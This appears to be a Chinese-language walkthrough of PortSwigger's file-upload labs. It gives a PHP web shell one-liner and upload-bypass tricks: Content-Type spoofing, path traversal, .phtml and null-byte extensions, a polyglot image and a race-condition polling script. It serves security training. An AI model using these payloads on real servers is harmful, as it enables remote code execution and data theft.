# File upload vulnerabilities


## [Lab: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
### 題目敘述
 This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 

### 題目解釋
使用提供的帳密登入後可以傳圖片，試著傳 Shell 來讀 `/home/carlos/secret`

### 解答
```
echo '<?php system("cat /home/carlos/secret") ?>' > s.php
```

然後直接傳

再到 

```
https://acb81f761fac47d9c0edd1190089005e.web-security-academy.net/files/avatars/s.php
```

觀察，就能看到檔案內容

## [Lab: Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
### 題目敘述
 This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
限制 Content-Type

### 解答
```
echo '<?php system("cat /home/carlos/secret") ?>' > s.php
```

上傳用 Burp 抓包，Content-Type 改 `image/jpeg`



## [Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
### 題目敘述
 This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
透過 path traversal 傳到前一層目錄

### 解答

直接傳，檔案會到
```
https://ac911fa71eacca43c09341b30014003d.web-security-academy.net/files/avatars/s.php
```

但不會被當 PHP 解


Burp 抓包 ，檔名改 `..%2Fs.php`

再直接訪問前一層
```
https://ac911fa71eacca43c09341b30014003d.web-security-academy.net/files/s.php
```

## [Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
### 題目敘述
 This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
封鎖 `.php` 附檔名

### 解答

直接傳
```
Sorry, php files are not allowed Sorry, there was an error uploading your file.
```

檔名改 `s.phtml`

```
https://ac321f5a1e008324c09a0d0b00ed00d0.web-security-academy.net/files/avatars/s.phtml
```

## [Lab: Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
### 題目敘述
 This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
驗證附檔名，可能可以用 `%00` 截斷

### 解答

直接傳
```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```

檔名用 Burp 改 `s.php%00.jpg`

```
https://ac4f1fb51e7a2ae4c025da5900420045.web-security-academy.net/files/avatars/s.php
```

## [Lab: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

### 題目敘述
 This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
驗 Magic number

### 解答

隨便載一張圖片疊起來
```
wget https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png
cat googlelogo_light_color_272x92dp.png >> ss.php
cat s.php >> ss.php
```

## [Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
### 題目敘述
 This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 


```php
 <?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?> 
```

### 題目解釋
透過 Race Condition，他會先存到目的地暫放，然後才會確認是否合法，如果不合法再刪掉。

### 解答

寫腳本一直抓
```
import requests

while True:
    res = requests.get("https://ac961fb91e49cafdc0da460c004800b7.web-security-academy.net/files/avatars/s.php")
    print(res.text)
```

然後也多上傳幾次，就可以收到了
